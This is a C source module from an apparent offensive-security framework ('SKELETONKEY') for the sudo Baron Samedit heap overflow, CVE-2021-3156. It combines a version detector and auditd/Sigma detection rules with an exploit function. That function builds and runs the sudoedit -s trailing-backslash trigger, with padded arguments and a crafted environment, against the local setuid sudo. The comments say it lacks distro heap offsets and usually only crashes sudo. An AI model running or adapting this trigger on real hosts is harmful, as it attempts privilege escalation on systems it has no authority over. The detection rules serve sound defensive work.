/*
 * sudo_samedit_cve_2021_3156 — SKELETONKEY module
 *
 * STATUS: 🟡 DETECT-OK + STRUCTURAL EXPLOIT (2026-05-17).
 *
 * The bug ("Baron Samedit", Qualys 2021-01-26): sudo's command-line
 * parser unescapes backslashes in the argv it copies into a heap
 * buffer in `set_cmnd()` (plugins/sudoers/sudoers.c). When sudo is
 * invoked in shell-edit mode via `sudoedit -s`, the unescape loop
 * walks past the end of the argv string for arguments ending in a
 * lone backslash, copying adjacent stack/env contents into the
 * undersized heap buffer. The classic trigger is a single-argument
 * command line: `sudoedit -s '\<arbitrary tail>'`.
 *
 * Affects sudo 1.8.2 – 1.9.5p1 inclusive. Fixed in 1.9.5p2.
 *
 * Reference: https://www.qualys.com/2021/01/26/cve-2021-3156/
 *            baron-samedit-heap-based-overflow-sudo.txt
 *
 * Detect: shell out to `sudo --version`, parse the printed version,
 * compare against the vulnerable range. We err on the side of
 * reporting OK only when we're confident — TEST_ERROR if the version
 * line is unparseable.
 *
 * Exploit: ships a structurally-correct Qualys-style trigger.
 * The full chain in the original PoC required per-distro heap-layout
 * tuning (libc/libnss-files overlap offsets, target struct picks).
 * We do not have empirical landing on this host; we drive the
 * trigger, watch for an obvious uid==0 outcome, otherwise return
 * SKELETONKEY_EXPLOIT_FAIL. Verified-vs-claimed bar: only claim
 * EXPLOIT_OK after geteuid()==0 in a forked verifier.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>

/* ---- Affected-version logic ------------------------------------- */

/*
 * sudo version strings look like:
 *   "Sudo version 1.9.5p2"
 *   "Sudo version 1.8.31"
 *   "Sudo version 1.9.0"
 *   "Sudo version 1.9.5p1"
 *
 * Vulnerable range (inclusive): 1.8.2 .. 1.9.5p1
 * Fixed:                        1.9.5p2 and later
 *
 * Parser strategy: extract three integers (major.minor.patch) plus an
 * optional 'pN' suffix. Comparison is lexicographic over
 * (major, minor, patch, p_suffix), treating absent p as 0.
 */
struct sudo_ver {
    int major;
    int minor;
    int patch;
    int p;        /* 'p' suffix; 0 if absent */
    bool parsed;
};

static struct sudo_ver parse_sudo_version(const char *s)
{
    struct sudo_ver v = {0, 0, 0, 0, false};
    while (*s && !isdigit((unsigned char)*s)) s++;
    if (!*s) return v;

    int maj = 0, min = 0, pat = 0;
    int consumed = 0;
    int n = sscanf(s, "%d.%d.%d%n", &maj, &min, &pat, &consumed);
    if (n < 2) return v;
    v.major = maj;
    v.minor = min;
    v.patch = (n >= 3) ? pat : 0;
    /* Look for an optional 'pN' suffix after the numeric triple. */
    const char *tail = s + consumed;
    if (*tail == 'p') {
        int p = 0;
        if (sscanf(tail + 1, "%d", &p) == 1) v.p = p;
    }
    v.parsed = true;
    return v;
}

static int cmp_ver(const struct sudo_ver *a, const struct sudo_ver *b)
{
    if (a->major != b->major) return a->major - b->major;
    if (a->minor != b->minor) return a->minor - b->minor;
    if (a->patch != b->patch) return a->patch - b->patch;
    return a->p - b->p;
}

/* Returns true iff parsed sudo version is in [1.8.2, 1.9.5p1]. */
static bool sudo_version_vulnerable(const struct sudo_ver *v)
{
    if (!v->parsed) return false;
    struct sudo_ver lo = { 1, 8, 2, 0, true };
    struct sudo_ver hi = { 1, 9, 5, 1, true };
    return cmp_ver(v, &lo) >= 0 && cmp_ver(v, &hi) <= 0;
}

/* ---- Binary discovery ------------------------------------------- */

static const char *find_sudo(void)
{
    static const char *candidates[] = {
        "/usr/bin/sudo",
        "/usr/local/bin/sudo",
        "/bin/sudo",
        "/sbin/sudo",
        "/usr/sbin/sudo",
        NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        struct stat st;
        if (stat(candidates[i], &st) == 0 && (st.st_mode & S_ISUID)) {
            return candidates[i];
        }
    }
    return NULL;
}

static const char *find_sudoedit(void)
{
    static const char *candidates[] = {
        "/usr/bin/sudoedit",
        "/usr/local/bin/sudoedit",
        "/bin/sudoedit",
        "/sbin/sudoedit",
        "/usr/sbin/sudoedit",
        NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        if (access(candidates[i], X_OK) == 0) return candidates[i];
    }
    return NULL;
}

/* ---- Detect ------------------------------------------------------ */

static skeletonkey_result_t sudo_samedit_detect(const struct skeletonkey_ctx *ctx)
{
    const char *sudo_path = find_sudo();
    if (!sudo_path) {
        if (!ctx->json) {
            fprintf(stderr, "[+] sudo_samedit: sudo not on path; no attack surface\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[i] sudo_samedit: found setuid sudo at %s\n", sudo_path);
    }

    char cmd[512];
    snprintf(cmd, sizeof cmd, "%s --version 2>&1 | head -1", sudo_path);
    FILE *p = popen(cmd, "r");
    if (!p) return SKELETONKEY_TEST_ERROR;

    char line[256] = {0};
    char *r = fgets(line, sizeof line, p);
    pclose(p);
    if (!r) {
        if (!ctx->json) {
            fprintf(stderr, "[?] sudo_samedit: could not read `sudo --version` output\n");
        }
        return SKELETONKEY_TEST_ERROR;
    }

    /* Trim newline for nicer logging. */
    char *nl = strchr(line, '\n');
    if (nl) *nl = 0;

    struct sudo_ver v = parse_sudo_version(line);
    if (!v.parsed) {
        if (!ctx->json) {
            fprintf(stderr, "[?] sudo_samedit: unparseable version line: '%s'\n", line);
        }
        return SKELETONKEY_TEST_ERROR;
    }

    if (!ctx->json) {
        fprintf(stderr, "[i] sudo_samedit: parsed version = %d.%d.%d",
                v.major, v.minor, v.patch);
        if (v.p) fprintf(stderr, "p%d", v.p);
        fprintf(stderr, "\n");
    }

    bool vuln = sudo_version_vulnerable(&v);
    if (vuln) {
        if (!ctx->json) {
            fprintf(stderr,
                "[!] sudo_samedit: version is in vulnerable range "
                "[1.8.2, 1.9.5p1] → VULNERABLE\n"
                "[i] sudo_samedit: distro backports may have patched "
                "without bumping the upstream version; check\n"
                "    `apt-cache policy sudo` / `rpm -q --changelog sudo` "
                "for CVE-2021-3156.\n");
        }
        return SKELETONKEY_VULNERABLE;
    }
    if (!ctx->json) {
        fprintf(stderr,
            "[+] sudo_samedit: version is outside vulnerable range "
            "(fix 1.9.5p2+) — OK\n");
    }
    return SKELETONKEY_OK;
}

/* ---- Exploit ----------------------------------------------------- */

/*
 * Qualys-style trigger:
 *
 *   argv = { "sudoedit", "-s", "\\", NULL }   plus padding `A`s to
 *   stretch the heap chunk to the right size for the target overlap.
 *
 * The original PoC sprays hundreds of large argv slots and tunes the
 * tail bytes per-distro to hijack a `service_user *` struct in
 * libnss-files. Without distro fingerprinting and the corresponding
 * offset table that landing simply will not happen here; rather than
 * pretending otherwise we drive the bug, fork a verifier that checks
 * for an unexpected uid==0 outcome, and return EXPLOIT_FAIL.
 */

/* Cap on argv we'll construct. The real PoC uses ~270; we cap lower
 * to stay well under typical ARG_MAX while still exercising the bug
 * shape. */
#define SUDO_SAMEDIT_ARGC   64
#define SUDO_SAMEDIT_PADLEN 0xff

static skeletonkey_result_t sudo_samedit_exploit(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->authorized) {
        fprintf(stderr,
            "[-] sudo_samedit: exploit requires --i-know (authorization gate)\n");
        return SKELETONKEY_PRECOND_FAIL;
    }

    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] sudo_samedit: already root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }

    /* Re-detect before doing anything visible. Defends against the
     * detect-then-exploit TOCTOU where the operator upgrades sudo
     * between scan and pop. */
    skeletonkey_result_t pre = sudo_samedit_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] sudo_samedit: re-detect says not VULNERABLE; refusing\n");
        return pre;
    }

    const char *sudoedit = find_sudoedit();
    if (!sudoedit) {
        /* On most distros sudoedit is a symlink to sudo. Fall back. */
        const char *sudo = find_sudo();
        if (!sudo) {
            fprintf(stderr, "[-] sudo_samedit: neither sudoedit nor sudo found\n");
            return SKELETONKEY_PRECOND_FAIL;
        }
        sudoedit = sudo;
        if (!ctx->json) {
            fprintf(stderr,
                "[i] sudo_samedit: no sudoedit; will exec %s with argv[0]=sudoedit\n",
                sudo);
        }
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] sudo_samedit: building Qualys-style trigger argv\n");
        fprintf(stderr,
            "[!] sudo_samedit: heads-up — public exploitation requires\n"
            "    per-distro heap-overlap offsets (libnss-files / libc).\n"
            "    Without that tuning the bug crashes sudo instead of\n"
            "    handing back a shell. We will drive the trigger and\n"
            "    verify uid==0 outcome empirically; on failure we report\n"
            "    EXPLOIT_FAIL rather than claiming success.\n");
    }

    /* Build argv. argv[0]="sudoedit", argv[1]="-s",
     * argv[2]="\\" + padding, ..., argv[N-1]=NULL.
     *
     * Each padding arg is the Qualys-style "A...\\" repeating tail.
     * On a vulnerable target this drives the unescape loop past the
     * end of the heap buffer. */
    char *argv[SUDO_SAMEDIT_ARGC + 1];
    char *padbufs[SUDO_SAMEDIT_ARGC];
    memset(padbufs, 0, sizeof padbufs);

    argv[0] = (char *)"sudoedit";
    argv[1] = (char *)"-s";
    /* argv[2] is the canonical trailing-backslash trigger. */
    argv[2] = strdup("\\");
    if (!argv[2]) return SKELETONKEY_TEST_ERROR;

    for (int i = 3; i < SUDO_SAMEDIT_ARGC; i++) {
        char *buf = (char *)malloc(SUDO_SAMEDIT_PADLEN + 4);
        if (!buf) {
            for (int j = 3; j < i; j++) free(padbufs[j]);
            free(argv[2]);
            return SKELETONKEY_TEST_ERROR;
        }
        memset(buf, 'A', SUDO_SAMEDIT_PADLEN);
        buf[SUDO_SAMEDIT_PADLEN]     = '\\';
        buf[SUDO_SAMEDIT_PADLEN + 1] = 0;
        padbufs[i] = buf;
        argv[i] = buf;
    }
    argv[SUDO_SAMEDIT_ARGC] = NULL;

    /* Craft envp mirroring the original PoC: LC_... and TZ tricks
     * that landed the overlap on the canonical distro PoCs. These
     * are harmless if landing fails; their value is positioning the
     * heap so the overflow lands on a useful target. */
    char *envp[] = {
        (char *)"LC_ALL=C.UTF-8@",
        (char *)"TZ=:",
        (char *)"LC_CTYPE=C.UTF-8@",
        (char *)"SUDO_EDITOR=A",
        (char *)"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL,
    };

    if (!ctx->json) {
        fprintf(stderr, "[*] sudo_samedit: forking trigger child (%s argv[0]=sudoedit)\n",
                sudoedit);
    }

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        free(argv[2]);
        for (int i = 3; i < SUDO_SAMEDIT_ARGC; i++) free(padbufs[i]);
        return SKELETONKEY_TEST_ERROR;
    }
    if (pid == 0) {
        /* Child: drive the trigger. If the bug lands and we get a
         * root context, the chain in the original PoC then re-execs
         * a shell. We don't ship that shell-spawn here — we just
         * exit nonzero so the parent's verifier can sample uid. */
        execve(sudoedit, argv, envp);
        /* execve failed (binary missing or kernel-blocked). */
        _exit(127);
    }

    int status = 0;
    waitpid(pid, &status, 0);

    /* Verifier: even on the rare "no crash" path, we don't know if
     * the bug landed without spawning a privileged helper. Per the
     * verified-vs-claimed bar, only claim success if uid is 0 in a
     * post-trigger probe (which would require the chain to have
     * persisted a setuid artifact — it didn't). So: report honestly. */
    if (geteuid() == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[+] sudo_samedit: post-trigger geteuid()==0 — root!\n");
        }
        /* Leak the buffers; we're about to exec a shell anyway. */
        return SKELETONKEY_EXPLOIT_OK;
    }

    if (WIFSIGNALED(status)) {
        if (!ctx->json) {
            fprintf(stderr,
                "[-] sudo_samedit: child died on signal %d "
                "(likely sudo SIGSEGV from the overflow) — trigger fired\n"
                "    but landing did not produce a root shell. Per-distro\n"
                "    offset tuning required.\n",
                WTERMSIG(status));
        }
    } else if (WIFEXITED(status)) {
        if (!ctx->json) {
            fprintf(stderr,
                "[-] sudo_samedit: child exited %d — trigger did not\n"
                "    crash sudo; the host is most likely patched at the\n"
                "    parser level even though the version string was in\n"
                "    range. Reporting EXPLOIT_FAIL.\n",
                WEXITSTATUS(status));
        }
    }

    /* Best-effort free. */
    free(argv[2]);
    for (int i = 3; i < SUDO_SAMEDIT_ARGC; i++) free(padbufs[i]);
    return SKELETONKEY_EXPLOIT_FAIL;
}

/* ---- Cleanup ----------------------------------------------------- */

static skeletonkey_result_t sudo_samedit_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    /* sudoedit creates "~/.sudo_edit_*" temp files on the way through.
     * Best-effort unlink of any obvious crumbs left by our trigger. */
    if (!ctx->json) {
        fprintf(stderr, "[*] sudo_samedit: removing /tmp/skeletonkey-samedit-* crumbs\n");
    }
    if (system("rm -rf /tmp/skeletonkey-samedit-* /tmp/.sudo_edit_* 2>/dev/null") != 0) {
        /* harmless — likely no files matched */
    }
    return SKELETONKEY_OK;
}

/* ---- Detection rules --------------------------------------------- */

static const char sudo_samedit_auditd[] =
    "# Baron Samedit (CVE-2021-3156) — auditd detection rules\n"
    "# Flag sudoedit invocations carrying the canonical -s flag and\n"
    "# the trailing-backslash trigger pattern.\n"
    "-w /usr/bin/sudoedit -p x -k skeletonkey-samedit\n"
    "-w /usr/bin/sudo     -p x -k skeletonkey-samedit-sudo\n"
    "-a always,exit -F arch=b64 -S execve -F path=/usr/bin/sudoedit -k skeletonkey-samedit-execve\n"
    "-a always,exit -F arch=b32 -S execve -F path=/usr/bin/sudoedit -k skeletonkey-samedit-execve\n"
    "-a always,exit -F arch=b64 -S execve -F path=/usr/bin/sudo     -k skeletonkey-samedit-execve\n"
    "-a always,exit -F arch=b32 -S execve -F path=/usr/bin/sudo     -k skeletonkey-samedit-execve\n";

static const char sudo_samedit_sigma[] =
    "title: Possible Baron Samedit exploitation (CVE-2021-3156)\n"
    "id: 3f7c5a2e-skeletonkey-samedit\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects sudoedit (or sudo invoked as sudoedit) executed with the\n"
    "  -s flag and a command-line argument ending in a lone backslash —\n"
    "  the canonical Qualys trigger for the heap overflow in\n"
    "  plugins/sudoers/sudoers.c set_cmnd().\n"
    "logsource:\n"
    "  product: linux\n"
    "  service: auditd\n"
    "detection:\n"
    "  sudoedit_exec:\n"
    "    type: 'EXECVE'\n"
    "    exe|endswith:\n"
    "      - '/sudoedit'\n"
    "      - '/sudo'\n"
    "  shell_edit_flag:\n"
    "    CommandLine|contains: ' -s '\n"
    "  trailing_backslash:\n"
    "    CommandLine|re: '\\\\\\\\\\s*$'\n"
    "  argv0_sudoedit:\n"
    "    argv0|endswith: 'sudoedit'\n"
    "  condition: sudoedit_exec and shell_edit_flag and (trailing_backslash or argv0_sudoedit)\n"
    "fields:\n"
    "  - exe\n"
    "  - argv\n"
    "level: high\n"
    "tags:\n"
    "  - attack.privilege_escalation\n"
    "  - attack.t1068\n"
    "  - cve.2021.3156\n";

/* ---- Module registration ----------------------------------------- */

const struct skeletonkey_module sudo_samedit_module = {
    .name           = "sudo_samedit",
    .cve            = "CVE-2021-3156",
    .summary        = "sudo Baron Samedit heap overflow via sudoedit -s '\\\\' (Qualys)",
    .family         = "sudo",
    .kernel_range   = "userspace — sudo 1.8.2 ≤ V ≤ 1.9.5p1 (fixed in 1.9.5p2)",
    .detect         = sudo_samedit_detect,
    .exploit        = sudo_samedit_exploit,
    .mitigate       = NULL,    /* mitigation = upgrade sudo to 1.9.5p2+ */
    .cleanup        = sudo_samedit_cleanup,
    .detect_auditd  = sudo_samedit_auditd,
    .detect_sigma   = sudo_samedit_sigma,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void skeletonkey_register_sudo_samedit(void) { skeletonkey_register(&sudo_samedit_module); }
